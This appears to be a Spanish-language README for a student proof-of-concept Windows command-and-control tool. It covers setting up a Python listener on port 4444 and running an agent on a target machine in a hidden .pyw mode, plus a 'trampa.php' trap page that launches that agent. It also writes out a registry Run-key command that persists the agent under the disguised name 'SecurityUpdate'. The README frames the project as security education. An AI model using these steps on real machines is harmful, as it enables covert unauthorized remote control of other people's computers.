<p align="center">
  <a href="#-requisitos-del-sistema">
    <img src="https://img.shields.io/badge/Network_Shield-Documentación-007bff?style=for-the-badge&logo=opsgenie" alt="Docs">
  </a>
  <a href="https://www.python.org/downloads/">
    <img src="https://img.shields.io/badge/Python-Descargar-ffd343?style=for-the-badge&logo=python&logoColor=black" alt="Python">
  </a>
  <a href="#-solución-de-problemas-troubleshooting">
    <img src="https://img.shields.io/badge/Soporte-Errores_Comunes-f44336?style=for-the-badge" alt="Errores">
  </a>
</p>

# 🛡️ Network Shield - Remote Administration System (PoC)

Este proyecto es una **Prueba de Concepto (PoC)** diseñada para estudiar el funcionamiento de los sistemas de administración remota (C2) y las técnicas de persistencia en entornos Windows.

**⚠️ AVISO LEGAL:** Este software ha sido creado exclusivamente con fines educativos e investigación en ciberseguridad. El autor no se hace responsable del mal uso de este código. El uso en sistemas sin autorización es ilegal.

---

## 🛠️ Requisitos del Sistema

* **XAMPP**: Servidor Apache y MySQL (MariaDB) instalados.
* **Python 3.x**: Instalado y configurado en el PATH.
* **Librerías**: Ejecuta **pip install requests** en tu terminal.
* **Base de Datos**: Importar el esquema incluido en **server/db.txt**.

---

## 🚀 Guía de Instalación y Configuración

### 1. Preparación de la Base de Datos

1.  Inicia **Apache** y **MySQL** desde el panel de XAMPP.
2.  Accede a **http://localhost/phpmyadmin**.
3.  Crea una base de datos llamada **network_shield_db**.
4.  Importa el contenido de **server/db.txt** en la pestaña **SQL**.

---

### 2. Configuración del Servidor Web

1.  Mueve la carpeta **Network-Shield-System** a **C:\xampp\htdocs\**.
2.  El panel será accesible en: **http://localhost/Network-Shield-System/server/index.php**.

---

## 📡 Ejecución y Pruebas

Sigue este orden estricto para establecer el enlace:

### 🟢 Paso 1: Iniciar el Receptor (Master)
Abre una terminal en la carpeta master/ y lanza el centro de control ejecutando:
**python receptor.py**

---

### 🔵 Paso 2: Lanzar el Agente (Client)
Ejecuta el script en el equipo objetivo para iniciar la conexión:
* **Modo Manual**: python client/agente.py
* **Modo Invisible**: Renombra a **agente.pyw** y ejecútalo.
* **Simulación Web**: Accede a **http://localhost/Network-Shield-System/server/trampa.php**

---

## 🔐 Implementación de Persistencia

La persistencia permite que el agente se ejecute automáticamente al iniciar sesión en Windows.

### 1️⃣ Instalación (Crear Registro)
Envía este comando desde la terminal del receptor para registrar el agente:
**reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "pythonw.exe C:\xampp\htdocs\Network-Shield-System\client\agente.pyw" /f**

---

### 2️⃣ Comprobación (Verificar Estado)
Para confirmar que el registro se ha creado correctamente, ejecuta:
**reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate"**

---

### 3️⃣ Eliminación (Limpieza del Sistema)
Para desactivar el inicio automático y dejar el sistema limpio, ejecuta:
**reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f**

---

## 📂 Estructura del Repositorio

* 📁 **server/**: Panel de control web y base de datos.
* 📁 **client/**: Ejecución de comandos en el objetivo (agente).
* 📁 **master/**: Consola interactiva C2 (Command & Control).

---

## 📋 Comandos de Auditoría Disponibles

* 💻 **Sistema**: whoami, systeminfo, tasklist, ipconfig.
* 📂 **Archivos**: dir, cd .., type archivo.txt.
* 🌐 **Remoto**: start https://google.com, msg * "Acceso detectado".
* 🚪 **Sesión**: **exit** (Cierra la conexión de forma segura).

---

## 🛠️ Solución de Problemas (Troubleshooting)

* **❌ Error "Windows no encuentra el archivo python"**: Este error en `trampa.php` ocurre porque Apache no detecta la ruta de Python. Edita tu archivo PHP y usa la ruta completa. Ejemplo: **C:\Python39\python.exe**.
* **🌐 ¿No conecta?**: Verifica que el puerto **4444** esté abierto en el Firewall de Windows.
* **🗄️ ¿Error de SQL?**: Asegúrate de que el usuario de MySQL sea **root** y no tenga contraseña.

---

<p align="center">
  Desarrollado con ❤️ para fines de aprendizaje en Ciberseguridad
</p>
